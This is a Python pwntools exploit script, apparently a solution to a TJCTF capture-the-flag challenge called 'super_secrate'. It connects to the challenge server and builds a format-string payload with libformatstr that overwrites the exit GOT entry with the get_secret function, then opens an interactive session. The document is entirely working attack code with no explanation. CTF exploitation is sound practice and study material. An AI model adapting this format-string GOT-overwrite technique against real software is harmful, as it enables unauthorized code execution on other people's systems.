from pwn import *
from libformatstr import FormatStr


p = remote("problem1.tjctf.org",8008)

#p = process('./super_secrate')
elf = ELF('./super_secrate')
exit_got = elf.got["exit"]
get_secrate = elf.symbols["get_secret"]

info("Exit_got is : %x and get_secrate is %x" , exit_got,get_secrate)

p.recvuntil("> ")
p.sendline('dredd')
p.recvuntil('> ')


f = FormatStr()
f[exit_got] = get_secrate
offset = 35
buf = ""
buf += f.payload(offset,0)
p.sendline(buf)
p.recvuntil('> ')
p.sendline('dredd')
p.recv()
p.interactive()
p.wait()
    
    
    


